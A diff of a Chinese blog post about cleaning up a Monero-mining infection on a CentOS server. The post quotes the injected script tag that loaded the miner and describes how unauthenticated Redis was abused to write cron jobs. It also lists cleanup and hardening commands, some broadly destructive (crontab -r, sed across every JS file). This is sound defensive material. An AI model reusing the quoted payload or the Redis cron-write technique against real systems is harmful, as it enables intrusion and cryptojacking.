@@ -17,28 +17,27 @@ tags:
 感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！
 </p>
 
-<div id="outline-container-org2fe9dc7" class="outline-2">
-<h2 id="org2fe9dc7"><span class="section-number-2">1</span> 事件描述</h2>
+<div id="outline-container-org9d7ea93" class="outline-2">
+<h2 id="org9d7ea93"><span class="section-number-2">1</span> 事件描述</h2>
 <div class="outline-text-2" id="text-1">
 </div>
-<div id="outline-container-org1c42f75" class="outline-3">
-<h3 id="org1c42f75"><span class="section-number-3">1.1</span> 概况</h3>
+<div id="outline-container-org5d883cb" class="outline-3">
+<h3 id="org5d883cb"><span class="section-number-3">1.1</span> 概况</h3>
 <div class="outline-text-3" id="text-1-1">
 <pre class="example">
 服务器安装系统为 CentOS 7，服务器用户一直采用密钥登录，通过用户登入攻击的可能性几乎为零。
 服务器上所有站点使用宝塔面板面板管理，所以可能性是通过攻破了宝塔面板进入，然后注入恶意挖矿脚本的。
 网站无法加载，会出现浏览器卡死的情况。
-
 </pre>
 </div>
 </div>
-<div id="outline-container-orgb89a4f3" class="outline-3">
-<h3 id="orgb89a4f3"><span class="section-number-3">1.2</span> 表象</h3>
+<div id="outline-container-org1cef11d" class="outline-3">
+<h3 id="org1cef11d"><span class="section-number-3">1.2</span> 表象</h3>
 <div class="outline-text-3" id="text-1-2">
 <pre class="example">
 下面陈述被攻击后的表象：
-
 </pre>
+
 <ul class="org-ul">
 <li>服务器资源被大量占用，资源占用率飙升；</li>
 <li>服务器所有JS文件被篡改，向输出页面增加了一个script标签（document.write('&lt;script src="<a href="http://t.cn/EvlonFh">http://t.cn/EvlonFh</a>"&gt;&lt;/script&gt;&lt;script&gt;OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")&lt;/script&gt;');）</li>
@@ -47,12 +46,12 @@ tags:
 </div>
 </div>
 </div>
-<div id="outline-container-org16eb1ed" class="outline-2">
-<h2 id="org16eb1ed"><span class="section-number-2">2</span> 问题排查及解决</h2>
+<div id="outline-container-org1e76d21" class="outline-2">
+<h2 id="org1e76d21"><span class="section-number-2">2</span> 问题排查及解决</h2>
 <div class="outline-text-2" id="text-2">
 </div>
-<div id="outline-container-orgc28c64c" class="outline-3">
-<h3 id="orgc28c64c"><span class="section-number-3">2.1</span> 排查</h3>
+<div id="outline-container-orgfaf8000" class="outline-3">
+<h3 id="orgfaf8000"><span class="section-number-3">2.1</span> 排查</h3>
 <div class="outline-text-3" id="text-2-1">
 <pre class="example">
 1. 访问服务器上运行的站点（包括宝塔面板），F12，发现不停访问一个wss的地址（wss://xmr.omine.org:8181/），并且很慢。
@@ -63,33 +62,32 @@ tags:
 攻击者通过redis命令 config set与save完成入侵过程.使用redis-cli -h &lt;ip&gt; &lt;port&gt; 登录服务redis-server，
 将redis的数据文件改到/var/spool/cron/root文件中，再通save 命令将定时任务shell脚本写入到/var/spool/cron/root 中，
 完成定时执行shell脚本，来实现提权及其它操作。
-
 </pre>
 </div>
 </div>
-<div id="outline-container-orgb1e8625" class="outline-3">
-<h3 id="orgb1e8625"><span class="section-number-3">2.2</span> 解决</h3>
+<div id="outline-container-orgf9c48e2" class="outline-3">
+<h3 id="orgf9c48e2"><span class="section-number-3">2.2</span> 解决</h3>
 <div class="outline-text-3" id="text-2-2">
 <pre class="example">
 1. 整理清理脚本
-
 </pre>
+
 <div class="org-src-container">
-<pre class="src src-shell" id="orge1af0e6"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#20808;&#20851;&#25481;redis&#31471;&#21475;</span>
+<pre class="src src-shell" id="orgcda5437"><span style="color: #727072;"># </span><span style="color: #727072; font-style: italic;">&#20808;&#20851;&#25481;redis&#31471;&#21475;</span>
 iptables -A INPUT -p tcp --dport 6379 -j DROP
-<span style="color: #b22222;"># </span><span style="color: #b22222;">&#28165;&#29702;&#23450;&#26102;&#20219;&#21153;</span>
+<span style="color: #727072;"># </span><span style="color: #727072; font-style: italic;">&#28165;&#29702;&#23450;&#26102;&#20219;&#21153;</span>
 crontab -r
-<span style="color: #b22222;"># </span><span style="color: #b22222;">&#28165;&#38500;redis key Back1 Back3 Back3</span>
+<span style="color: #727072;"># </span><span style="color: #727072; font-style: italic;">&#28165;&#38500;redis key Back1 Back3 Back3</span>
 redis-cli -h xxx.xxx.xxx.xxx -x del Back1
 redis-cli -h xxx.xxx.xxx.xxx -x del Back2
 redis-cli -h xxx.xxx.xxx.xxx -x del Back3
 redis-cli -h xxx.xxx.xxx.xxx -x CONFIG SET dbfilename dump.rdb
 redis-cli -h xxx.xxx.xxx.xxx -x CONFIG SET dir /tmp
 redis-cli -h xxx.xxx.xxx.xxx -x save
-<span style="color: #b22222;"># </span><span style="color: #b22222;">&#28165;&#29702;&#36816;&#34892;&#33050;&#26412;</span>
-<span style="color: #483d8b;">kill</span> -9 <span style="color: #ff00ff;">`ps -ef|grep shz.sh|grep -v grep|awk '{print $2}'`</span>
-<span style="color: #483d8b;">kill</span> -9 <span style="color: #ff00ff;">`ps -ef|grep zigw|grep -v grep|awk '{print $2}'`</span>
-<span style="color: #483d8b;">kill</span> -9 <span style="color: #ff00ff;">`ps -ef|grep cmd|grep -v grep|awk '{print $2}'`</span>
+<span style="color: #727072;"># </span><span style="color: #727072; font-style: italic;">&#28165;&#29702;&#36816;&#34892;&#33050;&#26412;</span>
+<span style="color: #ab9df2;">kill</span> -9 <span style="color: #fa8072;">`ps -ef|grep shz.sh|grep -v grep|awk '{print $2}'`</span>
+<span style="color: #ab9df2;">kill</span> -9 <span style="color: #fa8072;">`ps -ef|grep zigw|grep -v grep|awk '{print $2}'`</span>
+<span style="color: #ab9df2;">kill</span> -9 <span style="color: #fa8072;">`ps -ef|grep cmd|grep -v grep|awk '{print $2}'`</span>
 chattr -i /etc/zigw
 chattr -i /etc/shz.sh
 chattr -i /tmp/zigw
@@ -101,33 +99,33 @@ rm -rf /tmp/zigw
 rm -rf /tmp/shz.sh
 rm -rf ~/.cmd
 
-<span style="color: #b22222;"># </span><span style="color: #b22222;">&#28165;&#29702;SSH&#20813;&#30331;&#24405;&#20449;&#24687;</span>
+<span style="color: #727072;"># </span><span style="color: #727072; font-style: italic;">&#28165;&#29702;SSH&#20813;&#30331;&#24405;&#20449;&#24687;</span>
 cat /dev/null&gt; ~/.ssh/authorized_keys
-<span style="color: #b22222;"># </span><span style="color: #b22222;">&#28165;&#29702;js&#33050;&#26412;</span>
-find / -name <span style="color: #8b2252;">'*.js'</span>|xargs grep -L f4ce9|xargs sed -i <span style="color: #8b2252;">'$d'</span>
+<span style="color: #727072;"># </span><span style="color: #727072; font-style: italic;">&#28165;&#29702;js&#33050;&#26412;</span>
+find / -name <span style="color: #ffd866;">'*.js'</span>|xargs grep -L f4ce9|xargs sed -i <span style="color: #ffd866;">'$d'</span>
 mv /usr/bin/get /usr/bin/wget
 mv /usr/bin/url /usr/bin/curl
 </pre>
 </div>
 
 <div class="org-src-container">
-<pre class="src src-shell" id="org3951721"><span style="color: #b22222;">#</span><span style="color: #b22222;">!/bin/</span><span style="color: #a020f0;">bash</span>
-<span style="color: #b22222;"># </span><span style="color: #b22222;">By xzeu</span>
-<span style="color: #b22222;"># </span><span style="color: #b22222;">http://www.xzeu.com</span>
-<span style="color: #b22222;"># </span><span style="color: #b22222;">Email: admin#xzeu.com</span>
-<span style="color: #b22222;"># </span><span style="color: #b22222;">Filename: clearlink.sh</span>
+<pre class="src src-shell" id="orgd2852b8"><span style="color: #727072;">#</span><span style="color: #727072; font-style: italic;">!/bin/</span><span style="color: #ff6188;">bash</span>
+<span style="color: #727072;"># </span><span style="color: #727072; font-style: italic;">By xzeu</span>
+<span style="color: #727072;"># </span><span style="color: #727072; font-style: italic;">http://www.xzeu.com</span>
+<span style="color: #727072;"># </span><span style="color: #727072; font-style: italic;">Email: admin#xzeu.com</span>
+<span style="color: #727072;"># </span><span style="color: #727072; font-style: italic;">Filename: clearlink.sh</span>
 
-<span style="color: #b22222;">#</span><span style="color: #b22222;">Begin</span>
-find / -type f -name <span style="color: #8b2252;">'*.js'</span> |xargs fgrep -s -l <span style="color: #8b2252;">"e02cf4ce91284dab9bc3fc4cc2a65e28"</span>|xargs ls -l |awk <span style="color: #8b2252;">'{print $9}'</span>&gt;jsfile.txt
-<span style="color: #a020f0;">for</span> file<span style="color: #a020f0;"> in</span> <span style="color: #ff00ff;">`cat ~/jsfile.txt`</span>;
-<span style="color: #a020f0;">do</span>
-  <span style="color: #483d8b;">echo</span> $<span style="color: #a0522d;">file</span>
-  <span style="color: #b22222;"># </span><span style="color: #b22222;">sed -i '/e02cf4ce91284dab9bc3fc4cc2a65e28/d' $file</span>
-  <span style="color: #b22222;"># </span><span style="color: #b22222;">cp $file ${file}.bad</span>
-<span style="color: #a020f0;">done</span>
+<span style="color: #727072;">#</span><span style="color: #727072; font-style: italic;">Begin</span>
+find / -type f -name <span style="color: #ffd866;">'*.js'</span> |xargs fgrep -s -l <span style="color: #ffd866;">"e02cf4ce91284dab9bc3fc4cc2a65e28"</span>|xargs ls -l |awk <span style="color: #ffd866;">'{print $9}'</span>&gt;jsfile.txt
+<span style="color: #ff6188;">for</span> file<span style="color: #ff6188;"> in</span> <span style="color: #fa8072;">`cat ~/jsfile.txt`</span>;
+<span style="color: #ff6188;">do</span>
+  <span style="color: #ab9df2;">echo</span> $<span style="color: #fcfcfa;">file</span>
+  <span style="color: #727072;"># </span><span style="color: #727072; font-style: italic;">sed -i '/e02cf4ce91284dab9bc3fc4cc2a65e28/d' $file</span>
+  <span style="color: #727072;"># </span><span style="color: #727072; font-style: italic;">cp $file ${file}.bad</span>
+<span style="color: #ff6188;">done</span>
 
-<span style="color: #a020f0;">exit</span> 0
-<span style="color: #b22222;">#</span><span style="color: #b22222;">END</span>
+<span style="color: #ff6188;">exit</span> 0
+<span style="color: #727072;">#</span><span style="color: #727072; font-style: italic;">END</span>
 </pre>
 </div>
 
@@ -135,27 +133,26 @@ find / -type f -name <span style="color: #8b2252;">'*.js'</span> |xargs fgrep -s
 2. 恢复服务器中的js文件(其中grep的参数为小写的L)
 方法一：删除站点所有感染 js 文件，从代码仓库pull，重新上传部署。
 方法二：# find / -name '*.js' | xargs grep -l f4ce9 | xargs sed -i '/f4ce9/d'
-
 </pre>
 </div>
 </div>
-<div id="outline-container-orga77f413" class="outline-3">
-<h3 id="orga77f413"><span class="section-number-3">2.3</span> 预防</h3>
+<div id="outline-container-orged83ba8" class="outline-3">
+<h3 id="orged83ba8"><span class="section-number-3">2.3</span> 预防</h3>
 <div class="outline-text-3" id="text-2-3">
 <pre class="example">
 1. 限制内网访问，或者只限制本机访问
 只监听内网的IP，然后在iptables里面限制访问的主机：在/etc/redis/redis.conf中配置如下：
 bind 192.168.1.100
 如果服务只需要本机访问就直接监听127.0.0.1的回环地址就可以了。
-
 </pre>
+
 
 <pre class="example">
 2. 设置防火墙
 如果需要其他机器访问，或者设置了slave模式，那就记得加上相应的防火墙设置，命令如下：
 iptables -A INPUT -s 192.168.1.100/32 -p tcp --dport 6379 -j ACCEPT
-
 </pre>
+
 
 <pre class="example">
 3. 禁止root用户启动redis
@@ -163,28 +160,28 @@ iptables -A INPUT -s 192.168.1.100/32 -p tcp --dport 6379 -j ACCEPT
 edis crackit 漏洞就是利用root用户的权限来替换或者增加authorized_keys，来获取root登录权限的。
 使用root切换到redis用户启动服务:
 useradd -s /sbin/nolog -M redissetsid sudo -u redis /usr/bin/redis-server /etc/redis/redis.conf
-
 </pre>
+
 
 <pre class="example">
 4. 限制redis文件目录访问权限
 设置redis的主目录权限为700,如果redis配置文件独立于redis主目录,权限修过为600,因为redis密码明文存储在配置文件中。
-
 </pre>
+
 
 <pre class="example">
 5. 避免使用熟知的端口,降低被初级扫描的风险
 在/etc/redis/redis.conf中配置如下：
 找到port 6379这行，把6379改为9999，记得iptables对应的端口要修改
-
 </pre>
+
 
 <pre class="example">
 6. 开启redis密码认证,并设置高复杂度密码
 redis在redis.conf配置文件中，设置配置项requirepass， 开户密码认证。
 redis因查询效率高，auth这种命令每秒能处理10w次以上，简单的redis的密码极容易为攻击者暴破。 
-
 </pre>
+
 
 <pre class="example">
 7. 禁用或者重命名危险命令
@@ -199,13 +196,12 @@ rename-command FLUSHDB ""
 rename-command FLUSHALL ""
 上述配置将config，flushdb，flushall设置为了空，即禁用该命令，我们也可以命名为一些攻击者难以猜测，
 我们自己却容易记住的的名字。保存之后，执行/etc/init.d/redis-server restart 重启生效。
-
 </pre>
 </div>
 </div>
 </div>
-<div id="outline-container-org58c0bed" class="outline-2">
-<h2 id="org58c0bed"><span class="section-number-2">3</span> 参考</h2>
+<div id="outline-container-org59cde88" class="outline-2">
+<h2 id="org59cde88"><span class="section-number-2">3</span> 参考</h2>
 <div class="outline-text-2" id="text-3">
 <ul class="org-ul">
 <li><a href="https://www.cnblogs.com/Rebybyx/p/9913779.html">XMR恶意挖矿脚本处理笔记</a></li>
